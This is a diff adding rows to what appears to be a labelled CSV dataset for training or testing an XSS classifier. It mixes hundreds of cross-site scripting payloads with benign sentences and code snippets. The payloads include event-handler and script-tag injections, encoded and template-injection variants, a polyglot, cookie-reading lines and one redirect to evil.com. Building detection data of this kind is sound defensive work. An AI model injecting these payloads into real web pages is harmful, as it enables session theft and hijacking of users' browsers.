@@ -24894,3 +24894,2298 @@ Welcome to my profile! Great!,0
 Congratulations on your achievement Great!,0
 I work as a software engineer Thanks!,0
 Nice to meet you Great!,0
+"<button oncontextmenu=""alert(document.cookie)"">",1
+Error: <error>Invalid input</error>,0
+<form onclick='alert(window.location)'>,1
+"<select onchange=""alert(window.location)"">",1
+Inequality: 5 < x < 10,0
+<input/onsubmit=alert(window.location)>,1
+"{""tags"": [""<script>"", ""<iframe>"", ""<object>""], ""blocked"": true}",0
+How do I prevent <script> tags in user input?,0
+"<button onmouseout=""alert(1)"">",1
+<textarea onblur=confirm(1)>,1
+<form onload='alert(1)'>,1
+Stack Overflow: Why doesn't event handlers work?,0
+<svg onload=alert(6)>,1
+<span/onkeyup=prompt(1)>,1
+"Filter out event handlers like onclick, onload, onerror",0
+const regex = /<script|onerror=|javascript:/gi;,0
+I'm learning about XSS in my security class,0
+"Hello, how are you today?",0
+<details open ontoggle=alert(1)>,1
+"<input onsubmit=""confirm(1)"">",1
+"<input onsubmit=""alert(window.location)"">",1
+URL encoding like %3Cscript%3E can bypass filters,0
+<audio onwheel=prompt(1)>,1
+"<div oncontextmenu=""confirm(1)"">",1
+XSS Tutorial: Try injecting <script>console.log('test')</script> in a controlled environment,0
+<img src=x onerror=prompt(3)>,1
+Example: `<script>alert('test')</script>` should be escaped,0
+Example attack: <svg onload=alert(1)> should be stripped,0
+<input/ondrag=alert(1)>,1
+"Sanitize dangerous tags: <script>, <iframe>, <object>",0
+<img ondrop=alert(document.cookie)>,1
+<img oncontextmenu=confirm(1)>,1
+<body/onselect=prompt(1)>,1
+"// Remove dangerous tags: <script>, <iframe>, <object>",0
+"<marquee ondblclick=""alert(1)"">",1
+"OWASP recommends blocking: eval(), alert(), and prompt()",0
+I really appreciate your assistance.,0
+<script>eval('alert(1)')</script>,1
+<svg><animateTransform onbegin=alert(1)>,1
+Question: What is script injection?,0
+<details/onkeyup=alert(window.location)>,1
+<object/onwheel=confirm(1)>,1
+"<span oncontextmenu=""alert(window.location)"">",1
+<img src='photo.jpg' alt='My photo'>,0
+Check if input contains patterns like onerror= or onload=,0
+<div/ondrop=alert(document.cookie)>,1
+"<form onchange=""alert(1)"">",1
+I hope you're doing well.,0
+try { eval(userInput); } catch(e) { console.error(e); },0
+<a href='https://example.com'>Click here</a>,0
+<video/onblur=alert(window.location)>,1
+<marquee onmouseover='alert(1)'>,1
+<span onchange=alert(1)>,1
+if (x < 10 && y > 5) { console.log('valid'); },0
+Article title: Understanding XSS attacks,0
+<details/onmouseout=alert(window.location)>,1
+<script>alert(document.cookie)</script>,1
+"<input onload=""alert(1)"">",1
+Never allow javascript: protocol in href attributes,0
+<video/ondrag=alert(document.domain)>,1
+The function alert() is commonly used in XSS attacks,0
+Check for encoded payloads: &#60;script&#62; equals <script>,0
+Question: What is cross-site scripting?,0
+<p>This is a paragraph</p>,0
+<div/onerror=alert(window.location)>,1
+"<img src=x onerror=""alert(2)"">",1
+"Common XSS vectors include: javascript:, onerror=, and onload=",0
+${prompt(1)},1
+Have a great day!,0
+The blog post discusses event handlers vulnerabilities,0
+<audio onselect='prompt(1)'>,1
+<img src=x onerror=prompt(4)>,1
+<select onload=alert(1)>,1
+<select onmouseout='confirm(1)'>,1
+<embed onsubmit='alert(document.cookie)'>,1
+Tutorial: How to prevent JavaScript injection,0
+Visit https://example.com for more info,0
+<svg><animateTransform onbegin=alert(4)>,1
+Use regex to detect: /<script|onerror=|javascript:/gi,0
+<input onchange='alert(1)'>,1
+<script>alert(document.domain)</script>,1
+<span onclick=alert(document.cookie)>,1
+<textarea onmouseover=alert(1)>,1
+Stack Overflow: Why doesn't script injection work?,0
+<textarea/ondrag=alert(window.location)>,1
+Tutorial: How to prevent cross-site scripting,0
+Feel free to reach out anytime.,0
+if (typeof alert === 'function') { console.log('alert exists'); },0
+Special: Buy 1 <get> 2 free!,0
+<meta name='description' content='Best <product> ever!'>,0
+Question: What is JavaScript injection?,0
+<textarea onkeyup='alert(window.location)'>,1
+<embed src='javascript:alert(1)'>,1
+<button ondblclick=alert(window.location)>,1
+<textarea onsubmit='alert(1)'>,1
+Check out http://website.com/page?id=123,0
+<form onload=confirm(1)>,1
+<input/onkeydown=alert(document.domain)>,1
+<details/onmouseover=alert(document.cookie)>,1
+<marquee onwheel=confirm(1)>,1
+Let me know if you need anything.,0
+<marquee onsubmit=prompt(1)>,1
+Rating: 4.5/5 stars ⭐⭐⭐⭐,0
+<div onmouseout=alert(1)>,1
+<select/onblur=alert(document.domain)>,1
+Our store: Bed & Breakfast Inn,0
+"<iframe onchange=""alert(document.domain)"">",1
+<button onload=confirm(1)>,1
+<input type='text' placeholder='Enter name'>,0
+<img onwheel='alert(1)'>,1
+<details onfocus=prompt(1)>,1
+<video/onchange=alert(document.cookie)>,1
+"<embed oninput=""prompt(1)"">",1
+"<textarea onblur=""confirm(1)"">",1
+<ImG sRc=x OnErRoR=alert(7)>,1
+"<input onerror=""alert(document.cookie)"">",1
+<button onload='alert(1)'>,1
+<span onkeyup='prompt(1)'>,1
+<video/onsubmit=confirm(1)>,1
+<input ondrop='alert(document.domain)'>,1
+<img/oninput=prompt(1)>,1
+Welcome to our website!,0
+<textarea onload='alert(1)'>,1
+Logic: if (x > 0 && y < 100) return true;,0
+<object onsubmit='confirm(1)'>,1
+"<details onselect=""alert(1)"">",1
+<audio ondblclick='alert(document.domain)'>,1
+<div ondrag=alert(document.cookie)>,1
+<button type='submit'>Submit Form</button>,0
+"<embed onmouseout=""prompt(1)"">",1
+"{""xss_check"": ""<script>alert(1)</script>"", ""safe"": true}",0
+<img onblur='alert(1)'>,1
+"<audio onselect=""alert(document.cookie)"">",1
+<iframe onclick=alert(1)>,1
+<button oninput=alert(document.cookie)>,1
+Link: https://github.com/user/repo,0
+<object ondblclick='confirm(1)'>,1
+XML format: <root><item>data</item></root>,0
+<audio ondrag=alert(window.location)>,1
+<iframe oninput='alert(document.cookie)'>,1
+<ScRiPt>alert(1)</ScRiPt>,1
+"<video onwheel=""alert(window.location)"">",1
+<embed/onmouseout=alert(1)>,1
+<span onerror='confirm(1)'>,1
+The XSS payload <img src=x onerror=alert(1)> was blocked successfully.,0
+"<textarea onkeydown=""alert(1)"">",1
+The blog post discusses JavaScript injection vulnerabilities,0
+<textarea onload=alert(1)>,1
+"<audio ondblclick=""prompt(1)"">",1
+"{""event"": ""onclick"", ""action"": ""alert"", ""data"": ""<test>""}",0
+Expression: (a < b) && (c > d) || (e != f),0
+<embed onclick='alert(document.domain)'>,1
+Offer valid: January < February < March,0
+"<form onkeypress=""prompt(1)"">",1
+"<img src=x onerror=""alert(9)"">",1
+<input/onerror=confirm(1)>,1
+"<body onkeyup=""alert(1)"">",1
+<button onmouseout='alert(1)'>,1
+"<textarea ondrag=""alert(window.location)"">",1
+"<iframe onmouseout=""alert(window.location)"">",1
+<input onerror=alert(document.cookie)>,1
+<input onload='alert(1)'>,1
+"<img onwheel=""alert(document.cookie)"">",1
+Research paper on event handlers mitigation,0
+<img onerror='alert(1)'>,1
+<img onchange='alert(1)'>,1
+<marquee onkeydown=confirm(1)>,1
+<iframe onclick='alert(1)'>,1
+Thanks for your help!,0
+{{_c.constructor('alert(1)')()}},1
+<script>eval(atob('YWxlcnQoMSk='))</script>,1
+Tutorial: How to prevent script injection,0
+<details onmouseout='alert(document.cookie)'>,1
+<img ondrop='alert(window.location)'>,1
+<body/onerror=alert(document.cookie)>,1
+<video onblur='confirm(1)'>,1
+<embed/onselect=confirm(1)>,1
+<button oncontextmenu='alert(document.cookie)'>,1
+<details onblur='alert(document.domain)'>,1
+<input onmouseout=alert(1)>,1
+#{alert(1)},1
+"<iframe onclick=""confirm(1)"">",1
+<object ondrop='alert(1)'>,1
+<select ondblclick=alert(document.cookie)>,1
+"<marquee oncontextmenu=""prompt(1)"">",1
+<div ondrop=alert(document.cookie)>,1
+"<details onerror=""alert(1)"">",1
+<marquee/onkeydown=alert(1)>,1
+<button/onkeypress=alert(document.domain)>,1
+"<div onerror=""alert(window.location)"">",1
+"<iframe onblur=""alert(1)"">",1
+"<select onmouseout=""alert(1)"">",1
+<img/src=x/onerror=alert(5)>,1
+<img onchange=alert(1)>,1
+<div onmouseover=alert(1)>,1
+<embed ondblclick=alert(document.domain)>,1
+<select onblur='alert(document.domain)'>,1
+<audio onload=alert(document.cookie)>,1
+<audio/onsubmit=prompt(1)>,1
+<img onsubmit='alert(1)'>,1
+"'>""<img src=x onerror=alert(1)>",1
+"<form onload=""alert(window.location)"">",1
+"<select onkeydown=""alert(window.location)"">",1
+<iframe/ondrop=alert(window.location)>,1
+Research paper on JavaScript injection mitigation,0
+<iframe onblur=alert(1)>,1
+Article title: Understanding cross-site scripting attacks,0
+"<select onwheel=""confirm(1)"">",1
+The blog post discusses script injection vulnerabilities,0
+<object/onselect=confirm(1)>,1
+<form onkeypress=prompt(1)>,1
+<svg><animate onbegin=alert(7) attributeName=x>,1
+Code review: Found cross-site scripting in line 42,0
+<button ondrop='prompt(1)'>,1
+"function sanitize(input) { return input.replace(/<script>/gi, ''); }",0
+<textarea/onmouseover=confirm(1)>,1
+"<marquee onblur=""alert(window.location)"">",1
+<script>document.write('<img src=x onerror=alert(1)>')</script>,1
+Code review: Found XSS in line 42,0
+<button onkeydown=alert(1)>,1
+"<audio onwheel=""prompt(1)"">",1
+<object/onfocus=confirm(1)>,1
+<div/onclick=alert(document.cookie)>,1
+<svg><script>alert(2)</script></svg>,1
+"<input oninput=""confirm(1)"">",1
+"<video onblur=""alert(1)"">",1
+<select onkeypress='confirm(1)'>,1
+Article title: Understanding event handlers attacks,0
+<audio/ondrag=alert(window.location)>,1
+<div class='container'>Content here</div>,0
+<img onsubmit=alert(1)>,1
+"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//",1
+<audio ondrop=alert(document.cookie)>,1
+Stack Overflow: Why doesn't JavaScript injection work?,0
+"<details ondblclick=""confirm(1)"">",1
+<select/ondrag=alert(document.domain)>,1
+<body onclick='alert(1)'>,1
+<IMG SRC=x ONERROR=alert(1)>,1
+<div oninput=alert(document.domain)>,1
+{{$on.constructor('alert(1)')()}},1
+<div onfocus='alert(1)'>,1
+<embed/onclick=alert(window.location)>,1
+<span/onclick=alert(document.cookie)>,1
+"<textarea onerror=""alert(1)"">",1
+<span onkeydown=alert(document.cookie)>,1
+<audio/ondrag=confirm(1)>,1
+"<audio oninput=""alert(document.domain)"">",1
+Stack Overflow: Why doesn't cross-site scripting work?,0
+Nice to meet you!,0
+"<div onfocus=""prompt(1)"">",1
+<svg><set onbegin=alert(2) attributeName=x>,1
+<textarea/onselect=alert(document.domain)>,1
+"<input ondblclick=""alert(1)"">",1
+<body onkeydown='alert(document.domain)'>,1
+<button/onblur=alert(1)>,1
+<select oninput=alert(document.cookie)>,1
+"<img onblur=""alert(1)"">",1
+"<iframe onclick=""alert(1)"">",1
+<form onmouseout=alert(document.domain)>,1
+<input onclick=alert(1)>,1
+<details onwheel='prompt(1)'>,1
+<iframe/onclick=alert(window.location)>,1
+<div onload=confirm(1)>,1
+Contact: admin@company.org,0
+"<object onsubmit=""confirm(1)"">",1
+<img/ondrag=prompt(1)>,1
+<img/onwheel=alert(1)>,1
+Question: What is event handlers?,0
+"<img onmouseover=""alert(document.domain)"">",1
+<video ondrag=alert(document.domain)>,1
+<select onchange=alert(window.location)>,1
+<img src=x onerror=confirm(9)>,1
+<textarea onfocus='alert(1)'>,1
+"<video onblur=""alert(window.location)"">",1
+<marquee oncontextmenu=prompt(1)>,1
+<img onselect='alert(document.cookie)'>,1
+<select/onmouseover=alert(document.cookie)>,1
+<script>\u0061lert(1)</script>,1
+"<div onchange=""alert(window.location)"">",1
+<body onerror=alert(1)>,1
+I'm learning about cross-site scripting in my security class,0
+<textarea onwheel=prompt(1)>,1
+<img ondblclick=confirm(1)>,1
+Formula: x = (y < 10) ? 5 : 15,0
+<textarea onload='alert(document.domain)'>,1
+{{constructor.constructor('prompt(1)')()}},1
+"<audio onsubmit=""prompt(1)"">",1
+<marquee onerror='alert(document.domain)'>,1
+<input onkeypress=alert(document.cookie)>,1
+<button onkeypress='alert(document.domain)'>,1
+<video onchange=prompt(1)>,1
+<audio onclick='alert(1)'>,1
+<input/onchange=prompt(1)>,1
+<img src=x onerror=a lert(1)>,1
+<textarea/oncontextmenu=alert(document.cookie)>,1
+<iframe/onkeypress=confirm(1)>,1
+<span/onkeydown=alert(document.cookie)>,1
+<div/onerror=alert(document.domain)>,1
+My email is user@example.com,0
+<form/onkeyup=alert(window.location)>,1
+"<select onkeydown=""alert(1)"">",1
+<span onclick=alert(document.domain)>,1
+"<div onerror=""prompt(1)"">",1
+Article title: Understanding script injection attacks,0
+<input/onfocus=confirm(1)>,1
+<button/oncontextmenu=alert(document.domain)>,1
+<object oncontextmenu='alert(document.cookie)'>,1
+<textarea onsubmit='alert(document.domain)'>,1
+<img src=x onerror=prompt(1)>,1
+<div onselect=alert(document.cookie)>,1
+<marquee/onsubmit=confirm(1)>,1
+"<iframe onfocus=""alert(1)"">",1
+<details/ondblclick=confirm(1)>,1
+The blog post discusses cross-site scripting vulnerabilities,0
+<button onsubmit='alert(1)'>,1
+<div onblur='alert(1)'>,1
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}},1
+<audio onselect=prompt(1)>,1
+Question: What is XSS?,0
+<form ondblclick=prompt(1)>,1
+The blog post discusses XSS vulnerabilities,0
+<iframe onsubmit=alert(document.domain)>,1
+<form onclick='alert(1)'>,1
+<object/onerror=alert(document.cookie)>,1
+<div onload=alert(document.domain)>,1
+document.getElementById('demo').innerHTML = 'Hello';,0
+<textarea/ondrag=prompt(1)>,1
+"<input onselect=""prompt(1)"">",1
+<button/oncontextmenu=alert(document.cookie)>,1
+"window.addEventListener('load', function() { console.log('loaded'); });",0
+Price: $50 <discount> $40 (save 20%!),0
+<img src onerror=alert(3)>,1
+<iframe src='javascript:alert(1)'>,1
+"<object data='data:text/html,<script>alert(1)</script>'>",1
+"<input onchange=""prompt(1)"">",1
+<script>confirm(1)</script>,1
+<form onchange=alert(1)>,1
+<video onkeydown=alert(window.location)>,1
+<marquee onerror=alert(document.domain)>,1
+<script>window.location='http://evil.com'</script>,1
+<span onfocus=prompt(1)>,1
+<input onkeydown=prompt(1)>,1
+<button onfocus='alert(window.location)'>,1
+<details onmouseout=alert(window.location)>,1
+<img src onerror=alert(9)>,1
+<embed/onclick=alert(document.domain)>,1
+<select onblur='alert(1)'>,1
+<textarea ondrag='alert(document.domain)'>,1
+"<video onclick=""confirm(1)"">",1
+<select onmouseout=alert(1)>,1
+<audio/onchange=alert(1)>,1
+<audio ondrag=alert(1)>,1
+<object/ondrop=alert(1)>,1
+"<audio ondblclick=""alert(document.domain)"">",1
+<form onmouseout=alert(1)>,1
+<select/oninput=alert(window.location)>,1
+<script>alert(1)</script>,1
+"<details onload=""alert(window.location)"">",1
+<object/oncontextmenu=alert(document.cookie)>,1
+<video onblur=alert(window.location)>,1
+Note: Values must be < 100 and > 0,0
+<img onmouseout='alert(1)'>,1
+"<button onfocus=""alert(window.location)"">",1
+<body onkeydown=alert(1)>,1
+"<img ondrop=""alert(window.location)"">",1
+"<body onsubmit=""alert(document.cookie)"">",1
+"<video ondrag=""alert(document.domain)"">",1
+<img/onmouseover=alert(document.domain)>,1
+<select onfocus=alert(1)>,1
+<marquee/ondrag=alert(window.location)>,1
+<textarea ondrag='alert(document.cookie)'>,1
+"<form onload=""confirm(1)"">",1
+<img onkeyup='prompt(1)'>,1
+<marquee onsubmit=alert(document.cookie)>,1
+<iframe/ondblclick=alert(1)>,1
+I'm learning about JavaScript injection in my security class,0
+"<button onmouseover=""alert(1)"">",1
+<object onselect='alert(document.cookie)'>,1
+"<embed onchange=""alert(document.cookie)"">",1
+<marquee oninput='confirm(1)'>,1
+Looking forward to working with you.,0
+"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",1
+const handleClick = () => alert('Button clicked');,0
+<object onfocus='confirm(1)'>,1
+<img/onsubmit=alert(1)>,1
+<svg><animate onbegin=alert(1) attributeName=x>,1
+<details/onsubmit=alert(1)>,1
+<object onselect=alert(document.cookie)>,1
+<embed onfocus='alert(document.domain)'>,1
+<div onblur=alert(1)>,1
+<img src=x onerror=prompt(9)>,1
+<audio ondblclick='prompt(1)'>,1
+<svg><set onbegin=alert(7) attributeName=x>,1
+<button onclick='alert(window.location)'>,1
+"<button ondrop=""prompt(1)"">",1
+<img/onkeypress=prompt(1)>,1
+<button ondrag='prompt(1)'>,1
+<object ondblclick=alert(1)>,1
+<div onfocus=prompt(1)>,1
+"<body onerror=""alert(document.cookie)"">",1
+"<marquee onkeypress=""alert(document.domain)"">",1
+<details oncontextmenu=alert(document.cookie)>,1
+<img src=x onerror=prompt(7)>,1
+<span onkeypress=alert(window.location)>,1
+<img/ondrop=alert(document.cookie)>,1
+<details/onchange=alert(document.cookie)>,1
+<audio/onkeypress=alert(document.domain)>,1
+<IMG SRC=x ONERROR=alert(8)>,1
+<textarea onblur='confirm(1)'>,1
+<marquee/ondrag=confirm(1)>,1
+<video/ondblclick=alert(window.location)>,1
+"<form oninput=""prompt(1)"">",1
+"<marquee onkeydown=""alert(1)"">",1
+<textarea/onblur=prompt(1)>,1
+<video onsubmit=alert(document.domain)>,1
+<iframe onsubmit=alert(1)>,1
+<IMG SRC=x ONERROR=alert(4)>,1
+"<img oncontextmenu=""confirm(1)"">",1
+"<body onclick=""alert(1)"">",1
+<script>alert('XSS')</script>,1
+<img src='x' onerror='alert(6)'>,1
+<body onsubmit='alert(document.domain)'>,1
+<marquee onblur='alert(document.cookie)'>,1
+"<audio ondrag=""alert(document.domain)"">",1
+<form><button formaction=javascript:alert(1)>,1
+<iframe onclick='alert(window.location)'>,1
+<embed onselect=confirm(1)>,1
+"<body onkeydown=""alert(document.domain)"">",1
+Tutorial: How to prevent XSS,0
+<audio/ondrop=alert(1)>,1
+<video/onwheel=alert(document.cookie)>,1
+<input/onkeydown=prompt(1)>,1
+<object onerror=alert(document.domain)>,1
+<button/onfocus=alert(window.location)>,1
+<video onselect='confirm(1)'>,1
+<select onmouseover='alert(document.cookie)'>,1
+<img onmouseout=alert(1)>,1
+<h1>Welcome to Our Site</h1>,0
+<select onwheel='confirm(1)'>,1
+<span/onerror=alert(window.location)>,1
+<marquee ondblclick='alert(1)'>,1
+<audio src=x onerror=alert(1)>,1
+"<input onchange=""alert(1)"">",1
+"<div onselect=""confirm(1)"">",1
+<select onkeypress=alert(document.cookie)>,1
+<marquee onkeydown=alert(1)>,1
+<img onkeypress='confirm(1)'>,1
+<select/onfocus=prompt(1)>,1
+<span/ondblclick=prompt(1)>,1
+<marquee ondrag=alert(document.cookie)>,1
+<span onclick=alert(1)>,1
+<audio ondrop=prompt(1)>,1
+"{""pattern"": ""onerror="", ""type"": ""event_handler""}",0
+Research paper on cross-site scripting mitigation,0
+<form onkeypress='alert(document.domain)'>,1
+for (let i = 0; i < array.length; i++) { alert(array[i]); },0
+"<marquee onselect=""alert(1)"">",1
+<input onerror='alert(1)'>,1
+<button/onclick=alert(window.location)>,1
+<img src=x onerror=prompt(5)>,1
+"<video onwheel=""alert(document.cookie)"">",1
+<audio ondrag=alert(document.domain)>,1
+<iframe/oninput=alert(document.domain)>,1
+<input ondblclick='alert(1)'>,1
+"<marquee onload=""confirm(1)"">",1
+<audio/ondrag=alert(1)>,1
+"<button onload=""alert(1)"">",1
+<marquee onblur=confirm(1)>,1
+I'm learning about script injection in my security class,0
+Research paper on script injection mitigation,0
+"<div onkeypress=""prompt(1)"">",1
+<svg><set onbegin=alert(3) attributeName=x>,1
+<script>prompt(1)</script>,1
+"<input onmouseout=""alert(1)"">",1
+"<input oncontextmenu=""prompt(1)"">",1
+<details ondrag=confirm(1)>,1
+"<img src=x onerror=""alert(8)"">",1
+"<button ondrop=""alert(document.cookie)"">",1
+"<select onfocus=""alert(1)"">",1
+<marquee onblur='alert(window.location)'>,1
+<div/ondrag=alert(document.cookie)>,1
+&#60;script&#62;alert(1)&#60;/script&#62;,1
+"<select oncontextmenu=""prompt(1)"">",1
+<form onfocus=alert(1)>,1
+<iframe onsubmit='alert(document.domain)'>,1
+"<audio oncontextmenu=""alert(document.domain)"">",1
+"<form onmouseout=""alert(1)"">",1
+<body onsubmit='alert(1)'>,1
+<button onblur='alert(1)'>,1
+"<button onclick=""alert(window.location)"">",1
+<textarea ondrop='confirm(1)'>,1
+<input onselect=alert(1)>,1
+Code review: Found event handlers in line 42,0
+<input/onload=alert(1)>,1
+<select onblur=alert(document.domain)>,1
+<svg/onload=alert(3)>,1
+"<body onkeyup=""alert(document.domain)"">",1
+<button/onload=confirm(1)>,1
+<form/onkeypress=prompt(1)>,1
+<video onfocus=prompt(1)>,1
+<span ondblclick='prompt(1)'>,1
+<button onkeyup='alert(1)'>,1
+"<input ondrag=""alert(1)"">",1
+<iframe/ondrop=alert(1)>,1
+<object data='javascript:alert(1)'>,1
+"<textarea ondrag=""prompt(1)"">",1
+<input/onclick=prompt(1)>,1
+<input onerror=alert(1)>,1
+<video onclick='alert(document.cookie)'>,1
+"<textarea ondrop=""confirm(1)"">",1
+<marquee oninput=confirm(1)>,1
+<div/onload=alert(document.domain)>,1
+"<button ondblclick=""alert(window.location)"">",1
+<input/onmouseout=alert(window.location)>,1
+<div/onerror=alert(1)>,1
+<button onchange=alert(1)>,1
+"<body ondrop=""alert(document.cookie)"">",1
+<form onload=alert(1)>,1
+<marquee/onfocus=alert(1)>,1
+<svg><animateTransform onbegin=alert(7)>,1
+<img onkeydown='confirm(1)'>,1
+"<span onkeyup=""prompt(1)"">",1
+<div/onblur=prompt(1)>,1
+<details ondblclick=confirm(1)>,1
+"<button ondrag=""prompt(1)"">",1
+"<img onkeyup=""prompt(1)"">",1
+<textarea/onwheel=alert(window.location)>,1
+<img onkeydown=alert(document.domain)>,1
+<math><mi xlink:href='javascript:alert(1)'>click</mi></math>,1
+<video/onfocus=prompt(1)>,1
+"<details ondrag=""confirm(1)"">",1
+<marquee ondblclick=alert(1)>,1
+Article title: Understanding JavaScript injection attacks,0
+<details onwheel=prompt(1)>,1
+"<embed oncontextmenu=""alert(window.location)"">",1
+<div onwheel=alert(window.location)>,1
+<img/onselect=alert(document.domain)>,1
+<body onkeyup=alert(document.domain)>,1
+<details/onmouseout=alert(1)>,1
+<input onfocus='confirm(1)'>,1
+<details onkeydown=alert(window.location)>,1
+<img ondblclick=alert(window.location)>,1
+<form onerror=prompt(1)>,1
+I'm learning about event handlers in my security class,0
+<img src=x onerror=alert(8)>,1
+<audio ondblclick=alert(document.cookie)>,1
+"<input onfocus=""confirm(1)"">",1
+"<select onmouseover=""alert(1)"">",1
+<iframe onkeypress=confirm(1)>,1
+<button onkeydown='alert(document.cookie)'>,1
+<audio/onchange=alert(document.domain)>,1
+<img src=x onerror=prompt(10)>,1
+<marquee ondrag=confirm(1)>,1
+"<marquee onerror=""prompt(1)"">",1
+<button onerror='alert(1)'>,1
+<audio/onwheel=alert(window.location)>,1
+"<select onkeypress=""alert(document.cookie)"">",1
+<object/onselect=alert(1)>,1
+<img src='x' onerror='alert(3)'>,1
+<details/ondrag=prompt(1)>,1
+<iframe ondblclick=alert(1)>,1
+<details onfocus='prompt(1)'>,1
+<input/ondblclick=alert(1)>,1
+<textarea onselect=alert(1)>,1
+"<button onkeypress=""confirm(1)"">",1
+<marquee onload='confirm(1)'>,1
+"<object onblur=""confirm(1)"">",1
+"<form ondrop=""confirm(1)"">",1
+<audio/oninput=alert(window.location)>,1
+<object onblur=confirm(1)>,1
+<form/onload=alert(document.domain)>,1
+<audio/oncontextmenu=alert(window.location)>,1
+<textarea ondrop='alert(document.cookie)'>,1
+<button onmouseover=alert(1)>,1
+<marquee onblur=alert(window.location)>,1
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;,1
+<input onmouseout='alert(1)'>,1
+<input/onsubmit=alert(document.domain)>,1
+<svg><animate onbegin=alert(9) attributeName=x>,1
+<svg><set onbegin=alert(9) attributeName=x>,1
+<select onblur=alert(1)>,1
+<button onkeypress=alert(document.domain)>,1
+<audio ondrop=alert(1)>,1
+<audio onsubmit=prompt(1)>,1
+"<img onfocus=""alert(1)"">",1
+<embed onkeyup=alert(document.domain)>,1
+<iframe onsubmit=confirm(1)>,1
+<svg><script>alert(3)</script></svg>,1
+"<iframe onkeypress=""confirm(1)"">",1
+<span/oninput=alert(window.location)>,1
+<object onkeydown='alert(document.cookie)'>,1
+<iframe ondrop='confirm(1)'>,1
+"<video onkeypress=""confirm(1)"">",1
+<select onclick=prompt(1)>,1
+<button onfocus='alert(document.cookie)'>,1
+<IMG SRC=x ONERROR=alert(2)>,1
+<audio ondblclick=prompt(1)>,1
+<button oncontextmenu=alert(document.cookie)>,1
+<iframe/onkeyup=alert(window.location)>,1
+"<form onkeyup=""alert(window.location)"">",1
+<marquee oncontextmenu='prompt(1)'>,1
+API returns: <status>200</status>,0
+<IMG SRC=x ONERROR=alert(10)>,1
+<script>al ert(1)</script>,1
+"data:text/html,<script>alert(1)</script>",1
+"<span onkeydown=""alert(document.cookie)"">",1
+<audio/onkeypress=alert(document.cookie)>,1
+<textarea onerror='alert(1)'>,1
+<form ondrop='confirm(1)'>,1
+"<audio ondrag=""alert(1)"">",1
+"<marquee ondrag=""alert(window.location)"">",1
+<video src=x onerror=alert(1)>,1
+<video ondblclick=alert(window.location)>,1
+<img src=x onerror=prompt(6)>,1
+<input ondrag=alert(1)>,1
+"<input onerror=""alert(1)"">",1
+<iframe onchange='alert(document.domain)'>,1
+${alert(1)},1
+<span/onmouseover=alert(document.cookie)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img/oninput=alert(document.domain)>,1
+<textarea onchange='confirm(1)'>,1
+<video onload=alert(1)>,1
+${document.cookie},1
+<img onselect='alert(document.domain)'>,1
+<embed onclick=alert(window.location)>,1
+<object onfocus=confirm(1)>,1
+<body onmouseout='alert(1)'>,1
+<input/onselect=alert(1)>,1
+Stack Overflow: Why doesn't XSS work?,0
+<marquee/oninput=confirm(1)>,1
+<iframe onkeypress='confirm(1)'>,1
+Research paper on XSS mitigation,0
+"<video onchange=""prompt(1)"">",1
+<span onkeyup=prompt(1)>,1
+"<textarea onerror=""confirm(1)"">",1
+<IMG SRC=x ONERROR=alert(3)>,1
+<input onkeyup=alert(1)>,1
+<div onload=alert(1)>,1
+<img oninput='alert(document.domain)'>,1
+"<div onkeydown=""alert(1)"">",1
+<object onerror=alert(document.cookie)>,1
+"<audio onkeypress=""alert(document.domain)"">",1
+<body onmouseover='alert(1)'>,1
+<input ondrag='alert(1)'>,1
+<video onsubmit='alert(document.domain)'>,1
+"<textarea onchange=""prompt(1)"">",1
+<iframe onload=alert(1)>,1
+"<details onmouseout=""alert(1)"">",1
+<video/onclick=alert(document.cookie)>,1
+<video/onselect=alert(window.location)>,1
+<div onchange='alert(window.location)'>,1
+<embed onsubmit='confirm(1)'>,1
+<embed/onkeypress=alert(document.cookie)>,1
+<button/onfocus=alert(document.cookie)>,1
+<button/ondblclick=confirm(1)>,1
+<svg/onload=alert(5)>,1
+<marquee onkeypress=alert(document.cookie)>,1
+"<form onchange=""confirm(1)"">",1
+"<div onclick=""alert(1)"">",1
+<input onkeypress='alert(document.cookie)'>,1
+<audio ondrag=confirm(1)>,1
+<select onchange='alert(window.location)'>,1
+<audio/onload=alert(document.cookie)>,1
+"<textarea onblur=""alert(1)"">",1
+<select onwheel=confirm(1)>,1
+"<audio ondrop=""alert(1)"">",1
+<marquee/onwheel=confirm(1)>,1
+<button onkeyup='alert(document.cookie)'>,1
+<img/src=x/onerror=alert(8)>,1
+{{constructor.constructor('alert(1)')()}},1
+"<iframe oninput=""alert(document.domain)"">",1
+<svg><script>alert(5)</script></svg>,1
+<div ondrop='alert(document.cookie)'>,1
+<img src=x onerror=confirm(5)>,1
+<textarea onmouseover='confirm(1)'>,1
+<embed/oncontextmenu=prompt(1)>,1
+<body onkeyup='alert(1)'>,1
+"<img onwheel=""alert(1)"">",1
+<select ondrag='alert(document.domain)'>,1
+"<iframe onkeydown=""alert(1)"">",1
+"<embed onkeypress=""alert(document.cookie)"">",1
+<span ondrag='alert(1)'>,1
+<input onerror='alert(document.cookie)'>,1
+"<embed onmouseout=""alert(1)"">",1
+<textarea/ondrop=alert(document.cookie)>,1
+<body onsubmit=alert(document.domain)>,1
+"<details onblur=""alert(document.domain)"">",1
+<marquee onsubmit=confirm(1)>,1
+"<iframe ondrop=""alert(1)"">",1
+<select onkeydown=alert(1)>,1
+<marquee onstart=alert(1)>,1
+<svg onload=alert(1)>,1
+<form/onsubmit=confirm(1)>,1
+"<div onerror=""alert(1)"">",1
+<form onblur='alert(1)'>,1
+<audio/onerror=alert(1)>,1
+"<img onerror=""alert(1)"">",1
+<textarea onwheel='prompt(1)'>,1
+<img ondrag='alert(document.cookie)'>,1
+"<input ondrop=""alert(document.domain)"">",1
+<body onmouseout=alert(1)>,1
+"<body onmouseout=""alert(1)"">",1
+<details onmouseover='alert(document.cookie)'>,1
+<textarea oncontextmenu=alert(document.cookie)>,1
+<iframe ondrop=alert(1)>,1
+<body onmouseout=alert(document.domain)>,1
+<keygen onfocus=alert(1) autofocus>,1
+"<video onblur=""alert(document.domain)"">",1
+<audio onkeypress='alert(document.cookie)'>,1
+<video onerror=alert(window.location)>,1
+<input/onkeyup=alert(1)>,1
+<span onkeydown='alert(1)'>,1
+"<select onerror=""alert(1)"">",1
+<img oncontextmenu='confirm(1)'>,1
